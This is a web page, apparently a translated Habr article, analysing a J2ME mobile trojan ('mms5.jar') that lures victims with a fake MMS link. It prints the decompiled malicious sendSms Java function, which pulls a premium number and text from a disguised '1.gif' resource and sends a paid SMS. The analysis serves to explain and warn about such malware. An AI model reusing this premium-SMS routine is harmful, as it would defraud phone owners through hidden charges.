<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Trojan mobile jar study</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="It happens that you receive the following text message: ‚ÄúYou received an MMS-message, which can be viewed at the link: ...‚Äù Although now mobile viruse...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Trojan mobile jar study</h1><div class="post__text post__text-html js-mediator-article">  It happens that you receive the following text message: ‚ÄúYou received an MMS-message, which can be viewed at the link: ...‚Äù Although now mobile viruses have completely switched to Android devices, there are still old ‚Äúdinosaurs‚Äù, which are still then terrorize civilians. <br><br>  I got into my hands the file ‚Äúmms5.jar‚Äù, ‚Äã‚Äãwhich was instantly detected by Kaspersky Anti-Virus as a ‚ÄúTrojan Trojan-SMS.J2ME.Smmer.f‚Äù.  We will analyze it in detail. <br><a name="habracut"></a><br>  The file named "mms5.jar" is an archive of the "zip" format, which contains the files: <br><br><img src="https://habrastorage.org/files/c77/6c7/789/c776c7789b6a4f0eafe50e89ec8c685a.png" alt="image">
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      A prerequisite for the execution of the program contained in the archive with the name ‚Äúmms5.jar‚Äù is the presence in the archive of the file with the name ‚Äúmanifest.mf‚Äù in the directory ‚Äúmeta-inf‚Äù. <br><br><img src="https://habrastorage.org/files/b5c/345/9d7/b5c3459d7bf24da69096a02066b8f35a.png" alt="image"><br><br>  In accordance with the value of the ‚ÄúMicroEdition-Configuration‚Äù and ‚ÄúMicroEdition-Profile‚Äù parameters specified in the file called ‚Äúmanifest.inf‚Äù, it can be concluded that the program contained in the file named ‚Äúmms5.jar‚Äù is intended for mobile phones and pocket personal computers. <br><br>  Using the Fernflower decompiler, the \ mms \ poster.class file contained in the mms5.jar archive was decompiled. <br><br>  Then, using the JAVA ME SDK, the program obtained as a result of the decompilation was compiled and launched.  At the same time, an application named ‚ÄúCARD‚Äù was launched in the mobile phone emulator.  When you click on the "No" button, the CARD application completes its work. <br><br><img src="https://habrastorage.org/files/c94/ecc/5d9/c94ecc5d9df7477aabe9ca460a172ba6.png"><img src="https://habrastorage.org/files/299/35b/b33/29935bb3329c49d69c70d13cd3355079.png"><br><br>  When you click on the "Yes" button, the "sendSms" function is launched, if successfully executed, a window is displayed on the emulator screen, in which a picture with a kiss is shown. <br><br>  The malicious function "sendSms": <br><br><pre><code class="java hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">public</span></span></span><span class="hljs-function"> </span><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">boolean</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sendSms</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> flag = <span class="hljs-keyword"><span class="hljs-keyword">true</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(<span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.isRecordstoreExists()) { <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> flag; } <span class="hljs-keyword"><span class="hljs-keyword">else</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">try</span></span> { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> ex = <span class="hljs-number"><span class="hljs-number">0</span></span>; String s1 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.getResourceText(<span class="hljs-string"><span class="hljs-string">"/1.gif"</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> i; <span class="hljs-keyword"><span class="hljs-keyword">while</span></span>((i = s1.indexOf(<span class="hljs-string"><span class="hljs-string">"["</span></span>, ex)) &gt;= ex) { <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> crs = s1.indexOf(<span class="hljs-string"><span class="hljs-string">":"</span></span>, i); <span class="hljs-keyword"><span class="hljs-keyword">int</span></span> l; ex = l = s1.indexOf(<span class="hljs-string"><span class="hljs-string">"]"</span></span>, crs); String obj = s1.substring(i + <span class="hljs-number"><span class="hljs-number">1</span></span>, crs); String s = s1.substring(crs + <span class="hljs-number"><span class="hljs-number">1</span></span>, l); TextMessage textmessage; MessageConnection obj1; textmessage = (TextMessage)((MessageConnection)(obj1 = (MessageConnection)Con nector.open((String)(<span class="hljs-string"><span class="hljs-string">"sms://"</span></span> + obj)))).newMessage(<span class="hljs-string"><span class="hljs-string">"text"</span></span>)).setPayloadText(s); ((MessageConnection)((MessageConnection)obj1)).send(textmessage); ((MessageConnection)((MessageConnection)obj1)).close(); } <span class="hljs-keyword"><span class="hljs-keyword">boolean</span></span> crs1 = <span class="hljs-keyword"><span class="hljs-keyword">this</span></span>.createRecordstore(); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span>(crs1) { System.out.println(<span class="hljs-string"><span class="hljs-string">"Recordstore Created"</span></span>); } } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (SecurityException var10) { flag = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; } <span class="hljs-keyword"><span class="hljs-keyword">catch</span></span> (Exception var11) { flag = <span class="hljs-keyword"><span class="hljs-keyword">false</span></span>; var11.printStackTrace(); } <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> flag; } }</code> </pre> <br>  During the execution of the "sendSms" function, an attempt is made to send an SMS message to the number "1350" with the text "4969991 543". <br><br>  The number "1350" and the text "4969991 543" are taken from the file named "1.gif". <br><br><pre> <code class="java hljs">[<span class="hljs-number"><span class="hljs-number">1350</span></span>:<span class="hljs-number"><span class="hljs-number">4969991</span></span> <span class="hljs-number"><span class="hljs-number">543</span></span>]</code> </pre><br>  As a result, viewing this cute picture can cost you 300 rubles. </div><p>Source: <a href="https://habr.com/ru/post/254201/">https://habr.com/ru/post/254201/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../254187/index.html">Record of the webinar "Certified FSTEK version of Kerio Control 8.2"</a></li>
<li><a href="../254193/index.html">IBM invites to the Innovations in Business with IBM Cloud webinar</a></li>
<li><a href="../254195/index.html">Dart for the whole web</a></li>
<li><a href="../254197/index.html">Alternative mouse gesture control for Chrome and Firefox extensions</a></li>
<li><a href="../254199/index.html">My "Smart Home" on the PLC and with the web interface. Part 1. Introduction</a></li>
<li><a href="../254203/index.html">Clearing HTML tags from attributes</a></li>
<li><a href="../254205/index.html">TLS decryption of Java application traffic using logs</a></li>
<li><a href="../254207/index.html">English company blames Facebook for using its proprietary data center project for the Open Compute Project</a></li>
<li><a href="../254209/index.html">What answers do I expect at the testing interview?</a></li>
<li><a href="../254211/index.html">Long live fragrant soap, or how to fix improper scaling of Windows programs</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>